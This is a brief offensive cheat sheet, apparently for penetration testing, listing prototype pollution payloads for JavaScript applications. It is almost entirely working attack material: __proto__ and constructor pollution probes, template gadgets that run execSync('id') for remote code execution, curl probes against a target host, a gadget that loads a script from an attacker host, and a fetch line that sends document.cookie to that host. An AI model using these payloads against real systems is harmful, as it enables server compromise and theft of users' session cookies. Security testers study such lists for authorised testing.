# Prototype Pollution

## Try

```text
?__proto__[polluted]=1
?constructor[prototype][polluted]=1
```

```json
{"__proto__":{"polluted":"1"}}
{"constructor":{"prototype":{"polluted":"1"}}}
```

Check if it sticks:

```text
polluted
[object Object]
```

## URL Param Gadgets

```text
?name=a&__proto__[debug]=true
?name=a&__proto__[debug_url]=https://ATTACKER/x.js
?name=a&constructor[prototype][debug]=true
```

## Template Gadgets

```json
{"__proto__":{"client":true}}
{"__proto__":{"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').execSync('id')"}}
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
```

## Express / qs Checks

```bash
curl 'http://HOST/?__proto__[x]=1'
curl 'http://HOST/?constructor[prototype][x]=1'
curl -X POST http://HOST/ -H 'Content-Type: application/json' -d '{"__proto__":{"x":"1"}}'
curl -X POST http://HOST/ -H 'Content-Type: application/x-www-form-urlencoded' -d '__proto__[x]=1'
```

## Client Side

```html
<script src="https://ATTACKER/x.js"></script>
```

```js
fetch('https://ATTACKER/?c=' + encodeURIComponent(document.cookie))
```

